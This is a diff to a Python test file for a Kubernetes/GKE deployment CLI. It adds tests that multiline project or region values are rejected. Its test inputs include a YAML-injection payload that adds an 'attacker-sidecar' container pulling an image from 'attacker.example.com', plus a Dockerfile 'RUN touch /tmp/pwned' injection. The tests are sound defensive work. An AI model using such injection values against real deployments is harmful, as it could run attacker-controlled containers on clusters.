@@ -479,6 +479,68 @@ def test_to_gke_happy_path(
   assert str(rmtree_recorder.get_last_call_args()[0]) == str(tmp_path)
 
 
+@pytest.mark.parametrize("field", ["project", "region"])
+def test_to_gke_rejects_multiline_project_or_region(
+    monkeypatch: pytest.MonkeyPatch,
+    agent_dir: Callable[[bool, bool], Path],
+    tmp_path: Path,
+    field: str,
+) -> None:
+  """A newline in project or region must not reach the Kubernetes manifest.
+
+  Both values are interpolated directly into deployment.yaml's env entries
+  (f'value: "{project}"' / f'value: "{region}"'), with no YAML escaping.
+  An embedded newline breaks out of that quoted scalar and is interpreted
+  as new YAML structure -- with the right indentation, an entirely new,
+  attacker-controlled sibling container in the same pod spec, applied to
+  the cluster by the kubectl apply this function runs. This must be
+  rejected before deployment.yaml is ever written, let alone applied.
+  """
+  src_dir = agent_dir(False, False)
+  run_recorder = _Recorder()
+
+  def mock_subprocess_run(*args, **kwargs):
+    run_recorder(*args, **kwargs)
+    command_list = args[0]
+    if command_list and command_list[0:2] == ["kubectl", "apply"]:
+      fake_stdout = "deployment.apps/gke-svc created\nservice/gke-svc created"
+      return types.SimpleNamespace(stdout=fake_stdout)
+    return None
+
+  monkeypatch.setattr(subprocess, "run", mock_subprocess_run)
+  monkeypatch.setattr(shutil, "rmtree", _Recorder())
+
+  malicious_value = (
+      'us-central1"\n'
+      '      - name: attacker-sidecar\n'
+      '        image: attacker.example.com/backdoor:latest\n'
+  )
+  kwargs = dict(
+      agent_folder=str(src_dir),
+      project="gke-proj",
+      region="us-east1",
+      cluster_name="my-gke-cluster",
+      service_name="gke-svc",
+      app_name="agent",
+      temp_folder=str(tmp_path),
+      port=9090,
+      trace_to_cloud=False,
+      otel_to_cloud=False,
+      with_ui=True,
+      log_level="debug",
+      adk_version="1.2.0",
+  )
+  kwargs[field] = malicious_value
+
+  with pytest.raises(click.ClickException):
+    cli_deploy.to_gke(**kwargs)
+
+  # Rejected before any subprocess (gcloud build, kubectl apply) ran, and
+  # before deployment.yaml was written -- not merely before it was applied.
+  assert run_recorder.calls == []
+  assert not (tmp_path / "deployment.yaml").exists()
+
+
 def test_to_gke_without_region_omits_location(
     monkeypatch: pytest.MonkeyPatch,
     agent_dir: Callable[[bool, bool], Path],
@@ -2110,11 +2172,11 @@ def test_to_agent_engine_sets_gcp_project_and_enterprise_env(
 @pytest.mark.parametrize(
     "value", ["1", "true", "us-central1", "example.com:my-project", "", None]
 )
-def test_validate_dockerfile_env_value_accepts_single_line_values(
+def test_validate_no_newlines_accepts_single_line_values(
     value: Any,
 ) -> None:
   """Ordinary values, including domain-scoped project ids, are accepted."""
-  cli_deploy._validate_dockerfile_env_value("GOOGLE_CLOUD_PROJECT", value)
+  cli_deploy._validate_no_newlines("GOOGLE_CLOUD_PROJECT", value)
 
 
 @pytest.mark.parametrize(
@@ -2126,12 +2188,12 @@ def test_validate_dockerfile_env_value_accepts_single_line_values(
         "\nRUN touch /tmp/pwned",
     ],
 )
-def test_validate_dockerfile_env_value_rejects_multiline_values(
+def test_validate_no_newlines_rejects_multiline_values(
     value: str,
 ) -> None:
   """A value spanning more than one line is rejected by name, not by value."""
   with pytest.raises(click.ClickException) as exc_info:
-    cli_deploy._validate_dockerfile_env_value("GOOGLE_CLOUD_LOCATION", value)
+    cli_deploy._validate_no_newlines("GOOGLE_CLOUD_LOCATION", value)
   assert "GOOGLE_CLOUD_LOCATION" in str(exc_info.value)
   assert "RUN touch" not in str(exc_info.value)
 
